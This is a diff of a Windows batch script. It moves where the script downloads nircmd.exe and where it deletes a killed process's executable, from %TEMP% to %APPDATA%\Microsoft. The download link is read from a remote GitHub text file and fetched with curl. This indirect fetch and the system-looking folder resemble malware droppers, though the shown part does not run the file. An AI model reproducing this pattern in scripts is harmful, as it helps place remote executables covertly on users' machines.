@@ -30,7 +30,7 @@ echo.
 
 :: Kill & Delete file 
 taskkill /f /im !filename!.exe
-del /f /q "%TEMP%\!filename!.exe"
+del /f /q "%APPDATA%\Microsoft\!filename!.exe"
  
 for /f "delims=" %%i in ('curl -s https://raw.githubusercontent.com/Proseuo/Ujop/refs/heads/main/FileLinks/NircmdFileLink') do set "NIRCMDFILELINK=%%i"
 
@@ -39,12 +39,12 @@ echo NIRCMDFILELINK=%NIRCMDFILELINK%
 echo.
  
 :: Download the file using curl
-curl -L -# -o "%TEMP%\nircmd.exe" "%NIRCMDFILELINK%"
+curl -L -# -o "%APPDATA%\Microsoft\nircmd.exe" "%NIRCMDFILELINK%"
  
 timeout /t 2 /nobreak 
  
 :: Checking the existing of the file
-if not exist "%TEMP%\nircmd.exe" (
+if not exist "%APPDATA%\Microsoft\nircmd.exe" (
     echo.
     echo The download hasn't started yet. Please check your connection.
 	timeout /t 2 /nobreak 
@@ -57,7 +57,7 @@ if not exist "%TEMP%\nircmd.exe" (
  
  
 :: Get the file size in bytes
-for %%a in ("%TEMP%\nircmd.exe") do set "FILESIZE=%%~za"
+for %%a in ("%APPDATA%\Microsoft\nircmd.exe") do set "FILESIZE=%%~za"
  
  
  
